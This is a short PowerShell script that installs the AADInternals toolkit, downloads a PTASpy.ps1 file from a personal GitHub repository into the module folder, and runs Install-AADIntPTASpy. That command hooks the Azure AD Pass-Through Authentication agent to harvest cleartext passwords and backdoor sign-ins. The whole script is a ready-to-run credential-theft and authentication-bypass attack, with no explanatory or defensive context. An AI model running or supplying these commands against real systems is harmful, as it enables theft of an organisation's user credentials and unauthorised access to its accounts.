[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Install-Module aadinternals -Confirm:$false -Force
Import-Module aadinternals

curl https://raw.githubusercontent.com/kenji-winux/public-folder/main/PTASpy.ps1 -o "C:\Program Files\WindowsPowerShell\Modules\AADInternals\0.9.4\PTASpy.ps1"
Import-Module aadinternals -Force


Install-AADIntPTASpy
